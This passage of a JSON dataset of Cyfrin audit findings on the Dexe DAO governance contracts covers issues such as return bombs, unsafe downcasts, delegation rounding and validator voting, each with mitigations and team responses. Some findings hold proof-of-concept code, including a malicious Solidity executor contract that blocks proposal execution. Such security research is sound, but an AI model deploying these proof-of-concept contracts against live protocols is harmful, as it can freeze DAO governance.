rewardToken.balanceOf(DELEGATEE)).toFixed(), wei(\"80000000000000000000\"));\n        assert.equal((await rewardToken.balanceOf(DELEGATOR1)).toFixed(), wei(\"80000000000000000000\"));\n        assert.equal((await rewardToken.balanceOf(DELEGATOR2)).toFixed(), wei(\"240000000000000000000\"));\n\n        // DELEGATOR3 was able to get micropool rewards by delegating to DELEGATEE while\n        // ensuring that DELEGATEE didn't get any additional rewards\n        assert.equal((await rewardToken.balanceOf(DELEGATOR3)).toFixed(), \"3\");\n\n        // this doesn't seem to be seriously exploitable but it does break one of the core invariants\n        // in similar systems: that doing a bunch of smaller operations should have the same outcome as\n        // doing one equally big operation, eg: 25 different users each delegating 4 tokens to the voter\n        // should have the same outcome as 1 user delegating 100 tokens to the voter? */\n      });\n```\n\nRun with: `npx hardhat test --grep \"audit small delegations prevent delegatee\"`\n\n**Recommended Mitigation:** Consider enforcing a minimum delegation amount similar to how there is a minimum voting amount.\n\nPerhaps in `GovUserKeeper::delegateTokens()` [L136](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L136) & `undelegateTokens()` [L160](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L160) , enforce that `_micropoolsInfo[delegatee].tokenBalance == 0 || _micropoolsInfo[delegatee].tokenBalance > minimumVoteAmount`\n\nBy enforcing this here in both delegate & undelegate, this would prevent the situation where this state could be reached by delegating X, then undelegating Y such that X-Y > 0 but very small.\n\n**Dexe:**\nAcknowledged; this is straightaway a precision error in calculations. Depending on the rewards configuration, 1 or 2 wei may get lost in the process.\n\n\\clearpage",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Dexe",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "0kage"
      ]
    },
    {
      "id": "27321",
      "title": "Use low-level `call()` to prevent gas griefing attacks when returned data not required",
      "impact": "LOW",
      "content": "**Description:** Using `call()` when the returned data is not required unnecessarily exposes to gas griefing attacks from huge returned data payload. For [example](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/utils/TokenBalance.sol#L31):\n\n```solidity\n(bool status, ) = payable(receiver).call{value: amount}(\"\");\nrequire(status, \"Gov: failed to send eth\");\n```\n\nIs the same as writing:\n\n```solidity\n(bool status, bytes memory data ) = payable(receiver).call{value: amount}(\"\");\nrequire(status, \"Gov: failed to send eth\");\n```\n\nIn both cases the returned data will have to be copied into memory exposing the contract to gas griefing attacks, even though the returned data is not required at all.\n\n**Impact:** Contracts unnecessarily expose themselves to gas griefing attacks.\n\n**Recommended Mitigation:** Use a low-level call when the returned data is not required, eg:\n```solidity\nbool status;\nassembly {\n    status := call(gas(), receiver, amount, 0, 0, 0, 0)\n}\n```\n\nConsider using [ExcessivelySafeCall](https://github.com/nomad-xyz/ExcessivelySafeCall).\n\n**Dexe:**\nAcknowledged; calls to legitimate contracts will not revert. However, if the contract is corrupt it can just panic and achieve the same result.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Dexe",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "0kage"
      ]
    },
    {
      "id": "27320",
      "title": "Missing storage gap in `AbstractERC721Multiplier` can lead to upgrade storage slot collision",
      "impact": "LOW",
      "content": "**Description:** [`AbstractERC721Multiplier`](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/multipliers/AbstractERC721Multiplier.sol) is an upgradeable contract which has state but no storage gaps and has 1 child contract with its own state [`DexeERC721Multiplier`](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/multipliers/DexeERC721Multiplier.sol).\n\n**Impact:** Should an upgrade occur where the `AbstractERC721Multiplier` contract has additional state added to storage, a storage collision can occur where storage within the child contract `DexeERC721Multiplier` is overwritten.\n\n**Proof of Concept:** N/A\n\n**Recommended Mitigation:** Add a storage gap to the `AbstractERC721Multiplier` contract.\n\n**Dexe:**\nFixed in [PR164](https://github.com/dexe-network/DeXe-Protocol/commit/cdf9369193e1b2d6640c975d2c8e872710f6e065).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Dexe",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "0kage"
      ]
    },
    {
      "id": "27319",
      "title": "Unsafe downcast from uint256 to uint56 can silently overflow resulting in incorrect voting power for validators",
      "impact": "LOW",
      "content": "**Description:** `GovValidatorsCreate::createInternalProposal()` [L38](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/gov/gov-validators/GovValidatorsCreate.sol#L38) & `createExternalProposal()` [L67](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/gov/gov-validators/GovValidatorsCreate.sol#L67) performs an unsafe downcast from `uint256` to `uint56` which can silently overflow.\n\n**Impact:** If the overflow occurs proposals will be created with an incorrect `snapshotId` giving incorrect voting power to the validators.\n\n**Recommended Mitigation:** Use OpenZeppelin [SafeCast](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeCast.sol) so that if the downcast would overflow, it will revert instead.\n\n**Dexe:**\nAcknowledged. uint56 can’t be reached with incremental snapshots. It is that much: 72,057,594,037,927,935",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Dexe",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "0kage"
      ]
    },
    {
      "id": "27318",
      "title": "Proposal execution can be DOSed with return bombs when calling untrusted execution contracts",
      "impact": "MEDIUM",
      "content": "**Description:** `GovPool::execute` does not check for return bombs when executing a low-level call. A return bomb is a large bytes array that expands the memory so much that any attempt to execute the transaction will lead to an `out-of-gas` exception.\n\nThis can create potentially risky outcomes for the DAO. One possible outcome is \"single sided\" execution, ie. \"actionsFor\" can be executed when voting is successful while \"actionsAgainst\" can be DOSed when voting fails.\n\nA clever proposal creator can design a proposal in such a way that only `actionsFor` can be executed and any attempts to execute `actionsAgainst` will be permanently DOS'ed (refer POC contract). T\n\nThis is possible because the `GovPoolExecute::execute` does a low level call on potentially untrusted `executor` assigned to a specific action.\n\n```solidity\n   function execute(\n        mapping(uint256 => IGovPool.Proposal) storage proposals,\n        uint256 proposalId\n    ) external {\n        .... // code\n\n        for (uint256 i; i < actionsLength; i++) {\n>            (bool status, bytes memory returnedData) = actions[i].executor.call{\n                value: actions[i].value\n            }(actions[i].data); //@audit returnedData could expand memory and cause out-of-gas exception\n\n            require(status, returnedData.getRevertMsg());\n        }\n   }\n```\n\n**Impact:** Voting actions can be manipulated by a creator causing two potential issues:\n\n1. Proposal actions can never be executed even after successful voting\n2. One-sided execution where some actions can be executed while others can be DOSed\n\n**Proof of Concept:** Consider the following malicious proposal action executor contract. Note that when the proposal passes (`isVotesFor` = true), the `vote()` function returns empty bytes and when the proposal fails (`isVotesFor` = false), the same function returns a huge bytes array, effectively causing an \"out-of-gas\" exception to any caller.\n\n```solidity\ncontract MaliciousProposalActionExecutor is IProposalValidator{\n\n    function validate(IGovPool.ProposalAction[] calldata actions) external view override returns (bool valid){\n    \tvalid = true;\n    }\n\n    function vote(\n        uint256 proposalId,\n        bool isVoteFor,\n        uint256 voteAmount,\n        uint256[] calldata voteNftIds\n    ) external returns(bytes memory result){\n\n\tif(isVoteFor){\n\t\t// @audit implement actions for successful vote\n        \treturn \"\"; // 0 bytes\n        }\n\telse{\n\t\t// @audit implement actions for failed vote\n\n\t\t// Create a large bytes array\n                assembly{\n                     revert(0, 1_000_000)\n              }\n\t}\n\n   }\n}\n```\n\n**Recommended Mitigation:** Consider using [`ExcessivelySafeCall`](https://github.com/nomad-xyz/ExcessivelySafeCall) while calling untrusted contracts to avoid return bombs.\n\n**Dexe:**\nAcknowledged; we are aware of the fact that proposals may be stuck in the “succeeded” state. But probably we won’t alter this behavior on-chain since a DAO already decided to complete this proposal. Might add some labels on the front end.\n\n\\clearpage",
      "summary": "\nThis bug report is about a vulnerability in the `GovPool::execute` function, which does not check for return bombs when executing a low-level call. Return bombs are large bytes arrays that expand the memory so much that any attempt to execute the transaction will lead to an `out-of-gas` exception. This can create two risky outcomes for the DAO. First, a proposal's actions can never be executed even after successful voting. Second, one-sided execution where some actions can be executed while others can be DOSed. \n\nA malicious proposal action executor contract was provided as a proof of concept. This contract returns empty bytes when the proposal passes and a huge bytes array when the proposal fails, causing an `out-of-gas` exception to any caller.\n\nThe recommended mitigation for this vulnerability is to consider using `ExcessivelySafeCall` while calling untrusted contracts to avoid return bombs. The Dexe team acknowledged the vulnerability but decided not to alter the behavior on-chain since a DAO already decided to complete the proposal. They may add some labels on the front end.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Dexe",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "0kage"
      ]
    },
    {
      "id": "27317",
      "title": "Voting to change `RewardsInfo::voteRewardsCoefficient` has an unintended side-effect of retrospectively changing voting rewards for active proposals",
      "impact": "MEDIUM",
      "content": "**Description:** `GovSettings::editSettings` is one of the functions that can be executed via an internal proposal. When this function is called, setting are validated via `GovSettings::_validateProposalSettings`. This function does not check the value of `RewardsInfo::voteRewardsCoefficient` while updating the settings. There is neither a floor nor a cap for this setting.\n\nHowever, we've noted that this coefficient amplifies voting rewards as calculated in the `GovPoolRewards::_getInitialVotingRewards` shown below.\n\n```solidity\n    function _getInitialVotingRewards(\n        IGovPool.ProposalCore storage core,\n        IGovPool.VoteInfo storage voteInfo\n    ) internal view returns (uint256) {\n        (uint256 coreVotes, uint256 coreRawVotes) = voteInfo.isVoteFor\n            ? (core.votesFor, core.rawVotesFor)\n            : (core.votesAgainst, core.rawVotesAgainst);\n\n        return\n            coreRawVotes.ratio(core.settings.rewardsInfo.voteRewardsCoefficient, PRECISION).ratio(\n                voteInfo.totalVoted,\n                coreVotes\n            ); //@audit -> initial rewards are calculated proportionate to the vote rewards coefficient\n    }\n```\nThis has the unintended side-effect that for the same proposal, different voters can get paid different rewards based on when the reward was claimed. In the extreme case where `core.settings.rewardsInfo.voteRewardsCoefficient` is voted to 0, note that we have a situation where voters who claimed rewards before the update got paid as promised whereas voters who claimed later got nothing.\n\n**Impact:** Updating `rewardsCoefficient` can lead to unfair reward distribution on old proposals. Since voting rewards for a given proposal are communicated upfront, this could lead to a situation where promised rewards to users are not honoured.\n\n**Proof of Concept:** N/A\n\n**Recommended Mitigation:** Consider freezing `voteRewardMultiplier` and the time of proposal creation. A prospective update of this setting via internal voting should not change rewards for old proposals.\n\n**Dexe:**\nAcknowledged; similar issue to changing the nftMultiplier address. It is our design that if the DAO decides to change these parameters, this change is applied to all proposals including those in the past.",
      "summary": "\nThis bug report concerns a function called `GovSettings::editSettings` which is used to update settings in the internal proposal. This function does not check the value of `RewardsInfo::voteRewardsCoefficient` when updating the settings, which means that different voters can get paid different rewards for the same proposal. This has the unintended side-effect that for the same proposal, different voters can get paid different rewards based on when the reward was claimed. In the extreme case where `core.settings.rewardsInfo.voteRewardsCoefficient` is voted to 0, some voters may not receive the rewards they were promised.\n\nThis could lead to a situation where promised rewards to users are not honored, and it is recommended that `voteRewardMultiplier` and the time of proposal creation should be frozen. It is also noted that if the DAO decides to change these parameters, the change should be applied to all proposals including those in the past.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Dexe",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "0kage"
      ]
    },
    {
      "id": "27316",
      "title": "A misbehaving validator can influence voting outcomes even after their voting power is reduced to 0",
      "impact": "MEDIUM",
      "content": "**Description:** Validators are trusted parties appointed by DAO as a second-level check to prevent malicious proposals from getting executed.\nThe current system is designed with the following constraints:\n1. Executing `GovValidators::changeBalances` is the only way to assign or withdraw voting power to validators\n2. Any person holding a validator token balance gets to be a validator\n3. `GovValidatorsVote::vote` ensures that only token balances at the snapshotId when the validator proposal was created is used for voting\n\nThis design does not cover security risks associated with\na. loss of private keys\nb. inactive validator\nc. misbehaving validator\n\nWhile there is a provision to expel a validator by reducing his validator token balance to 0, the current system does not have a provision to prevent a validator from voting on active proposals with a back-dated snapshotId. If a validator is not aligned with the interests of the DAO and is expelled by voting, we believe it is a security risk to allow such validators to influence voting outcomes of active proposals\n\n**Impact:** A validator who no longer fulfils the trusted role of protecting DAO's best interests still holds control on DAO's future based on past voting power.\n\n**Proof of Concept:** Consider the following scenario:\n- Alice is a validator with 10% voting power in DAO A\n- Alice lost her private keys\n- Validators vote to execute `GovValidators::changeBalances` with Alice balance reduced to 0\n- Critical proposal P that is currently active with snapshotId where Alice has 10% voting power\n- Validators think P is not in the best interest of DAO and vote against\n- Alice's keys now controlled by hacker Bob who votes with 10% voting power\n- Proposal hits quorum and gets passed\n\nThis is a security risk for the DAO.\n\n**Recommended Mitigation:** Consider adding `isValidator` check for `vote` and `cancelVote` functions in `GovValidator`. This would prevent a validator with zero current balance to influence voting outcomes based on their back-dated voting power.\n\n**Dexe:**\nAcknowledged; we are using validator snapshotting so in past proposals they might have some voting power. We won’t change this behavior since otherwise removing the validator should also remove their votes from the ongoing proposals (not ideal to do on-chain).",
      "summary": "\nA bug report has been filed regarding the current system of validators in DAOs, which are trusted parties appointed to prevent malicious proposals from getting executed. The bug is that the current system does not have a provision to prevent a validator from voting on active proposals with a back-dated snapshotId, even if they have been expelled by reducing their validator token balance to 0. This poses a security risk to the DAO, as a validator who no longer fulfils the trusted role of protecting the DAO's best interests still holds control on the DAO's future based on past voting power. \n\nTo illustrate this, consider the scenario of Alice, a validator with 10% voting power in DAO A who has lost her private keys. The validators vote to execute `GovValidators::changeBalances` with Alice's balance reduced to 0, but a critical proposal P is currently active with a snapshotId where Alice has 10% voting power. If validators vote against the proposal, Alice's keys are now controlled by hacker Bob, who can vote with 10% voting power and potentially pass the proposal.\n\nThe recommended mitigation for this bug is to add an `isValidator` check for `vote` and `cancelVote` functions in `GovValidator`. This would prevent a validator with zero current balance from influencing voting outcomes based on their back-dated voting power. However, Dexe has acknowledged the bug and stated that they won't change this behavior, as it would not be ideal to do it on-chain to remove the validator's votes from ongoing proposals.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Dexe",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "0kage"
      ]
    },
    {
      "id": "27315",
      "title": "Proposal creation uses incorrect `ERC721Power::totalPower` as nft power not updated before snapshot",
      "impact": "MEDIUM",
      "content": "**Description:** If `GovPool` is configured to use `ERC721Power` nft, when the proposal is created it doesn't recalculate the nft power, just [reads](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L331) `ERC721Power::totalPower` straight from storage.\n\nThis is incorrect as it will be reading an old value; it has to recalculate nft power first then read it to read the correct, current value. There are [tests](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/test/gov/GovUserKeeper.test.js#L1470-L1471) in `GovUserKeeper` that do exactly this, before calling `GovUserKeeper::createNftPowerSnapshot()` the tests call `GovUserKeeper::updateNftPowers()`. But it looks like in the actual codebase there is never a call to `GovUserKeeper::updateNftPowers()`, only in the tests.\n\n**Impact:** Proposals are created with an incorrect & potentially much greater `ERC721Power::totalPower`. This is used as [the divisor in GovUserKeeper::getNftsPowerInTokensBySnapshot()](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L559) hence a stale larger divisor will incorrectly reduce the voting power of nfts.\n\n**Proof of Concept:** First [comment out this check](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L690) to allow the test to update the nft in-place.\n\nThen add the PoC to `GovPool.test.js` under section `describe(\"getProposalState()\", () => {`:\n```javascript\n      it(\"audit proposal creation uses incorrect ERC721Power totalPower as nft power not updated before snapshot\", async () => {\n        let powerNftCalcStartTime = (await getCurrentBlockTime()) + 200;\n\n        // required so we can call .toFixed() on BN returned outputs\n        ERC721Power.numberFormat = \"BigNumber\";\n\n        // ERC721Power::totalPower should be zero as no nfts yet created\n        assert.equal((await nftPower.totalPower()).toFixed(), \"0\");\n\n        // so proposal doesn't need to go to validators\n        await changeInternalSettings(false);\n\n        // set nftPower as the voting nft\n        // need to comment out check preventing updating existing\n        // nft address in GovUserKeeper::setERC721Address()\n        await impersonate(govPool.address);\n        await userKeeper.setERC721Address(nftPower.address, wei(\"33000\"), 33, { from: govPool.address });\n\n        // create a new VOTER account and mint them 5 power nfts\n        let VOTER = await accounts(10);\n        await nftPower.safeMint(VOTER, 1);\n        await nftPower.safeMint(VOTER, 2);\n        await nftPower.safeMint(VOTER, 3);\n        await nftPower.safeMint(VOTER, 4);\n        await nftPower.safeMint(VOTER, 5);\n\n        // advance to the approximate time when nft power calculation starts\n        await setTime(powerNftCalcStartTime);\n\n        // save existing nft power after power calculation has started\n        let nftTotalPowerBefore = \"4500000000000000000000000000\";\n        assert.equal((await nftPower.totalPower()).toFixed(), nftTotalPowerBefore);\n\n        // advance time; since none of the nfts have collateral deposited\n        // their power will decrement\n        await setTime((await getCurrentBlockTime()) + 10000);\n\n        // create a proposal which takes a snapshot of the current nft power\n        // but fails to update it before taking the snapshot, so uses the\n        // old incorrect power\n        let proposalId = 2;\n\n        await govPool.createProposal(\n          \"example.com\",\n          [[govPool.address, 0, getBytesGovVote(3, wei(\"100\"), [], true)]],\n          [[govPool.address, 0, getBytesGovVote(3, wei(\"100\"), [], false)]]\n        );\n\n        // verify the proposal snapshot saved the nft totalPower before the time\n        // was massively advanced. This is incorrect as the true totalPower is 0\n        // by this time due to the nfts losing power. The proposal creation process\n        // fails to recalculate nft power before reading ERC721Power::totalPower\n        assert.equal((await userKeeper.nftSnapshot(2)).toFixed(), nftTotalPowerBefore);\n\n        // call ERC721::recalculateNftPower() for the nfts, this will update\n        // ERC721Power::totalPower with the actual current total power\n        await nftPower.recalculateNftPower(\"1\");\n        await nftPower.recalculateNftPower(\"2\");\n        await nftPower.recalculateNftPower(\"3\");\n        await nftPower.recalculateNftPower(\"4\");\n        await nftPower.recalculateNftPower(\"5\");\n\n        // verify that the true totalPower has decremented to zero as the nfts\n        // lost all their power since they didn't have collateral deposited\n        assert.equal((await nftPower.totalPower()).toFixed(), \"0\");\n\n        // the proposal was created with an over-inflated nft total power\n        // GovUserKeeper has a function called updateNftPowers() that is onlyOwner\n        // meaning it is supposed to be called by GovPool, but this function\n        // is never called anywhere. But in the GovUserKeeper unit tests it is\n        // called before the call to createNftPowerSnapshot() which creates\n        // the snapshot reading ERC721Power::totalPower\n      });\n```\n\nRun with: `npx hardhat test --grep \"audit proposal creation uses incorrect ERC721Power totalPower\"`\n\n**Recommended Mitigation:** As there could be many nfts calling `GovUserKeeper::updateNftPowers()` one-by-one is not an efficient way of doing this update. A solution may involve refactoring of how power nfts work.\n\n**Dexe:**\nFixed in [PR172](https://github.com/dexe-network/DeXe-Protocol/commit/b2b30da3204acd16da6fa61e79703ac0b6271815), [PR173](https://github.com/dexe-network/DeXe-Protocol/commit/15edac2ba207a915bd537684cd7644831ec2c887). Removed snapshotting.\n\n**Cyfrin:** Verified.",
      "summary": "\nThis bug report is about the `GovPool` feature of the DeXe Protocol, which is a decentralized exchange protocol. If the `GovPool` is configured to use `ERC721Power` nft (non-fungible token), when the proposal is created it doesn't recalculate the nft power, but reads the `ERC721Power::totalPower` straight from storage. This is incorrect as it will be reading an old value and should recalculate nft power first.\n\nThe impact of this bug is that proposals are created with an incorrect and potentially much greater `ERC721Power::totalPower`. This is used as the divisor in `GovUserKeeper::getNftsPowerInTokensBySnapshot()`, hence a stale larger divisor will incorrectly reduce the voting power of nfts.\n\nThe recommended mitigation for this bug is to refactor how power nfts work, as calling `GovUserKeeper::updateNftPowers()` one-by-one is not an efficient way of doing this update.\n\nThe bug has been fixed in PR172 and PR173, and the snapshotting has been removed. The bug has been verified by Cyfrin.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Dexe",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "0kage"
      ]
    },
    {
      "id": "27314",
      "title": "Changing `nftMultiplier` address by executing a proposal that calls `GovPool::setNftMultiplierAddress()` can deny existing users from claiming pending nft multiplier rewards",
      "impact": "MEDIUM",
      "content": "**Description:** [`GovPool::setNftMultiplierAddress()`](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/GovPool.sol#L343-L345) which can be called by an internal proposal updates the nft multiplier address to a new contract.\n\n`GovPoolRewards::_getMultipliedRewards()` [calls](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/gov/gov-pool/GovPoolRewards.sol#L203) `GovPool::getNftContracts()` to retrieve the nft multiplier address when calculating rewards. If the contract has been updated to a different one any unclaimed nft multiplier rewards will no longer exist.\n\n**Impact:** Users will lose their unclaimed nft multiplier rewards when a proposal gets required votes to execute `GovPool::setNftMultiplierAddress()`.\n\n**Proof of Concept:** N/A\n\n**Recommended Mitigation:** The address of the current nft multiplier contract could be saved for each proposal when the proposal is created, such that updating the global nft multiplier address would only take effect for new proposals.\n\nIf this is indeed the intended design, consider implementing user notifications to alert all users with unclaimed NFT multiplier rewards to collect them before the proposal voting period concludes. Furthermore, consider incorporating explicit disclaimers in the documentation to inform users that voting on a proposal aimed at updating multiplier rewards may result in the forfeiture of unclaimed rewards. This transparency will help users make informed decisions and mitigate potential unexpected outcomes.\n\n**Dexe:**\nAcknowledged; this is expected behavior. If a DAO decides to add/remove the NFT multiplier, it should affect every DAO member regardless. This actually works in two ways: if a DAO decides to add an NFT multiplier, every unclaimed reward will be boosted.",
      "summary": "\nThis bug report is about the `GovPool::setNftMultiplierAddress()` function in the DeXe Protocol. This function is called by an internal proposal and updates the nft multiplier address to a new contract. When calculating rewards, `GovPoolRewards::_getMultipliedRewards()` calls `GovPool::getNftContracts()` to retrieve the nft multiplier address. This means that if the contract is updated to a different one, any unclaimed nft multiplier rewards will no longer exist.\n\nThe impact of this bug is that users will lose their unclaimed nft multiplier rewards when a proposal gets required votes to execute `GovPool::setNftMultiplierAddress()`.\n\nThe recommended mitigation for this bug is to save the address of the current nft multiplier contract for each proposal when the proposal is created, such that updating the global nft multiplier address would only take effect for new proposals. Additionally, user notifications should be implemented to alert all users with unclaimed NFT multiplier rewards to collect them before the proposal voting period concludes. Furthermore, explicit disclaimers should be included in the documentation to inform users that voting on a proposal aimed at updating multiplier rewards may result in the forfeiture of unclaimed rewards.\n\nThe DeXe team has acknowledged this bug and stated that if a DAO decides to add/remove the NFT multiplier, it should affect every DAO member regardless. This can work in two ways: if a DAO decides to add an NFT multiplier, every unclaimed reward will be boosted.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Dexe",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "0kage"
      ]
    },
    {
      "id": "27313",
      "title": "Users can use delegated treasury voting power to vote on proposals that give them more delegated treasury voting power",
      "impact": "MEDIUM",
      "content": "**Description:** [`GovPoolCreate::_restrictInterestedUsersFromProposal()`](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/gov/gov-pool/GovPoolCreate.sol#L164-L170) allows users to be restricted from voting on proposals that undelegate treasury voting power from a user, however no such restriction applies regarding voting on proposals that delegate treasury voting power to a user. This allows users who have received delegated treasury voting power to use that same power to vote on proposals that give them even more delegated treasury power.\n\n**Impact:** Users can use delegated treasury voting power to vote for proposals that give them even more delegated treasury voting power - seems dangerous especially since these can be internal proposals.\n\n**Proof of Concept:** N/A\n\n**Recommended Mitigation:** Option 1) `GovPoolCreate::_restrictInterestedUsersFromProposal()` should allow users to be restricted from voting on proposals that delegate treasury voting power.\n\nOption 2) It might be simpler to just hard-code this restriction in; if a user has delegated treasury voting power, then they can't vote on proposals that increase/decrease this power.\n\nThe principle would be that users who receive delegated treasury voting power only keep this power at the pleasure of the DAO, and they can never use this power to vote on proposals that increase/decrease this power, for themselves or for other users.\n\nRight now it is dependent upon the user creating the proposals to restrict the correct users from voting which is error-prone, and only works for decreasing, not increasing, this power.\n\n**Dexe:**\nFixed in [PR168](https://github.com/dexe-network/DeXe-Protocol/commit/01bc28e89a99da5f7b67d6645c935f7230a8dc7b).\n\n**Cyfrin:** Dexe has chosen to allow restricted users to vote on such proposals, just not with their delegated treasury. The delegated treasury of restricted users is subtracted from the required quorum calculation and restricted users can't vote with it on those proposals. This applies to delegating/undelegating treasury & burning expert nfts, such that users who have received delegated treasury power can't use it to delegate themselves more treasury power.\n\nHowever, Dexe has not fully implemented the recommendation that: _\"they can never use this power to vote on proposals that increase/decrease this power, for themselves **or for other users**.\"_ A user with delegated treasury power can get around the new restrictions by creating a proposal to delegate treasury power to another address they control, then voting on that proposal with their existing address that has delegated treasury power.\n\nCyfrin continues to recommend that users who have received delegated treasury voting power are not allowed to vote on any proposals that delegate/undelegate treasury voting power, both for themselves but also for other users.",
      "summary": "\nThis bug report is about the [`GovPoolCreate::_restrictInterestedUsersFromProposal()`](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/gov/gov-pool/GovPoolCreate.sol#L164-L170) function in the DeXe Protocol. This function allows users to be restricted from voting on proposals that undelegate treasury voting power from a user, however no such restriction applies regarding voting on proposals that delegate treasury voting power to a user. This means users who have received delegated treasury voting power can use that same power to vote on proposals that give them even more delegated treasury power. This is considered dangerous, especially since these can be internal proposals. \n\nThe recommended mitigation is either that the `GovPoolCreate::_restrictInterestedUsersFromProposal()` function should allow users to be restricted from voting on proposals that delegate treasury voting power, or to just hard-code this restriction in. This would mean that users who receive delegated treasury voting power only keep this power at the pleasure of the DAO, and they can never use this power to vote on proposals that increase/decrease this power, for themselves or for other users. \n\nDexe has fixed the issue by allowing restricted users to vote on such proposals, just not with their delegated treasury. However, they have not fully implemented the recommendation that users who have received delegated treasury voting power are not allowed to vote on any proposals that delegate/undelegate treasury voting power, both for themselves but also for other users. Cyfrin continues to recommend that this restriction is put in place.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Dexe",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "0kage"
      ]
    },
    {
      "id": "27312",
      "title": "`GovPool::revoteDelegated()` doesn't support multiple tiers of delegation resulting in delegated votes not flowing through to the primary voter",
      "impact": "MEDIUM",
      "content": "**Description:** When a proposal has `delegatedVotingAllowed == false` such that automatic delegation re-voting will occur in [`GovPoolVote::revoteDelegated()`](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/gov/gov-pool/GovPoolVote.sol#L103-L106), delegated votes don't flow through multiple tiers of delegations down to the primary voter.\n\n**Impact:** Delegated votes through multiple tiers of delegation don't get counted as they don't flow down to the primary voter.\n\nThis issue is significant when analyzing voting behavior in established DAOs. In a presentation by [KarmaHQ](https://www.youtube.com/watch?v=ckxxujKd7ug&t=950s), it was noted that over 50% of delegates across protocols never participate in proposal voting. The current system's design, despite enabling multi-tier delegation, fails to accurately track and account for such delegated tokens.\n\n\n**Proof of Concept:** Consider 1 proposal & 3 users: FINAL_VOTER, FIRST_DELEGATOR, SECOND_DELEGATOR where every user has 100 voting power.\n\n1) FINAL_VOTER votes 100\n\n2) FIRST_DELEGATOR delegates their 100 votes to FINAL_VOTER. This triggers the automatic cancellation & re-voting of FINAL_VOTER such that FINAL_VOTER has 200 total votes on the 